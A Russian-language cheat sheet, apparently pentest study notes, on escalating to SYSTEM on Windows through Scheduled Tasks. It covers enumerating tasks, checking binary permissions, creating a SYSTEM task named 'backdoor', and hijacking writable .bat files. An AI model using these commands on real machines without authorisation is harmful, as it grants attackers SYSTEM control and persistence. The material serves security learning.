##  **Эскалация через Scheduled Tasks (Планировщик задач)**


### 🔍 **1. Просмотр списка задач**

```cmd
schtasks
```


### 👤 **2. Найти задачи, запускающиеся от SYSTEM (PowerShell)**

```powershell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -like "*SYSTEM*"} | Select-Object TaskName, State
```


### 👤 **3. Найти задачи конкретного пользователя (CMD)**

```cmd
schtasks /query /fo LIST /v | findstr /i "test-user"
```


### 📄 **4. Подробная информация о задаче**

```cmd
schtasks /query /tn vulntask /fo LIST /v
```


### 🔐 **5. Проверить права на бинарник, который запускает задача**

```cmd
icacls "C:\Program Files\SomeApp\service.exe"
```


### 📂 **6. Где могут лежать файлы задач (уязвимые папки)**

Иногда задачи запускают `.bat` или `.exe` из следующих папок. Если ты можешь писать в эти папки, ты можешь подменить файл задачи:

```cmd
C:\tasks\
C:\Windows\tasks\
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\
```


### 🚀 **7. Создание своей задачи от SYSTEM**

Если у тебя есть права на создание задач, ты можешь выполнить команду от имени SYSTEM:

```cmd
schtasks /Create /SC ONCE /TN backdoor /TR "cmd.exe /c whoami > C:\Users\Public\whoami.txt" /ST 00:00 /RL HIGHEST /RU SYSTEM /F
```

**Объяснение:**
- `/SC ONCE` — задача выполняется один раз.
- `/TN backdoor` — имя задачи.
- `/TR` — команда, которая будет выполнена.
- `/RL HIGHEST` — выполнить с наивысшими правами.
- `/RU SYSTEM` — выполнить от имени SYSTEM.
- `/ST 00:00` — время запуска (если время прошло, запускаем вручную).
- `/F` — принудительно перезаписать задачу, если такая уже существует.

**Запуск задачи вручную:**

```cmd
schtasks /Run /TN backdoor
```

**Проверка результата:**

```cmd
type C:\Users\Public\whoami.txt
```


### 🧠 **8. Если задача не запускается из-за времени**

Если ты получил предупреждение `WARNING: Task may not run because /ST is earlier than current time`, просто запусти задачу вручную:

```cmd
schtasks /Run /TN backdoor
```


### ⚠️ **9. Если нет прав на создание задач**

Тогда ищи **уязвимый файл** (например, `cleanup.bat` в `C:\Windows\tasks`), который уже запускается от SYSTEM. Добавь в него свою команду и дождись выполнения.


## 📌 **Итог**

- `schtasks /Create /RU SYSTEM` — создание задачи от SYSTEM.
- `/RUN` — принудительный запуск.
- Уязвимые папки для `.bat` / `.exe`: `C:\tasks`, `C:\Windows\tasks`.
